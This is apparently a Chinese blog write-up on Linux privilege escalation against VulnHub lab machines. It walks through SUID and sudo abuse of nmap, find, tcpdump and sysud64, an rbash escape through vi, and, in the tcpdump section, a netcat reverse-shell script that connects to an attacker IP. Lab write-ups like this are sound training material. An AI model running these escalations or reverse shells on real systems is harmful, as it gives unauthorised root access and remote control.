## 0x00 前言

最近一直漏扫工具人，好久不搞测试，手就得生疏了，所以搞了一些靶机，记录一下其中遇到的`Linux`的提权。

## 0x01 nmap提权

`sudo -l`

![](../Images/5cd369e517b85c46199e139301b6232e.png)

发现可以无密使用`root`权限执行`namp`。可以通过`nmap`来提权。  

### 1.1 nmap(2.02至5.21)

靶机`Mr-Robot`下载地址：`https://www.vulnhub.com/entry/mr-robot-1,151/`

`nmap`低版本存在交互模式，允许用户执行`shell`命令。

`find / -perm -4000 2> /dev/null //查询靶机可执行的二进制文件`

![](../Images/7225648e8114629ef40dd9cfc9d6fbef.png)

发现存在`nmap`，查看`nmap`版本。

![](../Images/1e10b4b1493e31bc47d62c30cdd91123.png)

执行`nmap --interactive`，提权成功。

![](../Images/c65acab31d25651c23623f824758eceb.png)

### 1.2 namp其它高版本

靶机`DC-6`下载地址:`https://www.vulnhub.com/entry/dc-6,315/`

`nmap `可以执行脚本文件，可以创建一个文件并写入反弹 `shell` 的命令，从而提权。查看一下`namp`的版本。

![](../Images/4df94760b73d6c553adf88953db1a5bc.png)

*   
*   

```
echo 'os.execute("/bin/sh")' > shellsudo -u root nmap --script=shell
```

提权成功：

![](../Images/0ecdd49a951d4bd55cfddbb9991923ec.png)

利用`python`获取一个交互式`shell` `python -c '__import__("pty").spawn("/bin/bash")'`

![](../Images/4c07f6c10a88e8e5fc64c4b9cdf756ee.png)

## 0x02 find提权

靶机`DC-1`下载地址:`https://www.vulnhub.com/entry/dc-1,292/`

利用`msf`的`Drupal`的漏洞，获得了靶机的`session`,而且`session`的类型为`meteperter`. `sessions -l //查看session的类型`

然后：

*   
*   
*   

```
shell//利用python获得一个交互式的shellpython -c '__import__("pty").spawn("/bin/bash")'
```

![](../Images/0b4b1194ee79fa85fb4dcfbf4560beb2.png)

然后提权。

`find / -perm -4000 2> /dev/null //查询靶机可执行的二进制文件`

![](../Images/50793135120273338aafb5fff3c80371.png)

发现`find`，可以利用这个进行提权。

*   
*   
*   

```
touch testfind test -exec whoami \;    //find命令检查是否以root用户身份执行命令find test -exec /bin/sh \;    //使用find命令执行/bin/sh
```

![](../Images/b8b3c6641e50eab507cfba539eccfc65.png)

## 0x03 tcpdump提权

靶机`webdeveloper`下载地址：`https://www.vulnhub.com/entry/webdeveloper-1,288/`

查看一下执行的权限：

![](../Images/2956479f1e65b313722b0ffe03ef85ac.png)

以`root`权限运行`tcpdump`。

*   
*   
*   

```
当当前用户可以通过sudo执行tcpdump时，可以用来进行提权
tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而达到提权的目的
```

先写一个反弹的脚本(192.168.0.102`ip`是`attack`的)

`echo "mknod backpipe p && nc 192.168.0.102 4444 0<backpipe | /bin/bash 1>backpipe" >> /tmp/shell.sh`

然后赋权，并使用`tcpdump`执行命令：

*   
*   

```
chmod +x /tmp/shell.shsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
```

![](../Images/02f806a32ee482de88e68957e8a904ba.png)

成功提权。

![](../Images/a1fbbe917a51726b08d1cf6601e83b05.png)

## 0x04 sysud64提权

靶机`unknowndevice64`下载地址:`https://www.vulnhub.com/entry/unknowndevice64-1,293/` 这个靶机是`rbash`的`shell`

![](../Images/fa0805e0208df8faa1a6fa894d267204.png)

如果可以执行`vi`和`export`命令，可以绕过`rbash`进行提权。`vi`打开，输入`:!/bin/bash`

![](../Images/23cd56e19f193db39ba20594a7eefc25.png)

执行结果如下，然后执行操作：

*   
*   

```
export SHELL=/bin/bash:$SHELL   //将/bin/bash导出到shell环境变量export PATH=/usr/bin:$PATH    //将/usr/bin目录导出到PATH环境变量
```

![](../Images/2768e508d9daa20e58a82658774423a9.png)

发现`sysud64`，然后使用`sysud64`的`-o file`用法将`root`用户的`shell`导出到该用户

`sudo sysud64 -o /dev/null /bin/sh`

查看权限，为`root`权限。提权成功：

![](../Images/0faf82afdaac870d6e78e2068c371d0a.png)
